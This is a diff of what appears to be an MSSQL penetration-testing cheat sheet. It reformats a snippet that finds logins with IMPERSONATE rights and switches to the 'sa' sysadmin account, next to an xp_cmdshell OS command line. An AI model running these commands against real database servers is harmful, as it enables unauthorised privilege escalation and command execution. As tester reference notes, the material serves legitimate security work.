@@ -65,14 +65,10 @@ EXEC xp_cmdshell 'echo test > C:\temp\test.txt';
 
 ## Impersonation abuse:
 ```
-SELECT distinct b.name
-   FROM sys.server_permissions a
-   INNER JOIN sys.server_principals b
-   ON a.grantor_principal_id = b.principal_id
-   WHERE a.permission_name = 'IMPERSONATE';
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
 
-   EXECUTE AS LOGIN = 'sa';
-   SELECT SYSTEM_USER;
+EXECUTE AS LOGIN = 'sa';
+SELECT SYSTEM_USER;
 ```
 
 ## MSFCONSOLE
